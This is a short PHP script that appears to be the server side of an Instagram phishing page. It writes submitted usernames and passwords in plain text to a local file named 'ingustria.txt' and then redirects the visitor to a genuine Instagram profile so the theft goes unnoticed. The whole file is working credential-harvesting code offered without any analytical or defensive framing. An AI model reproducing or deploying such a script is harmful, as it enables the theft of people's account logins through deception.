<?php

file_put_contents("ingustria.txt", "user: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com/ingustria');
exit();
?>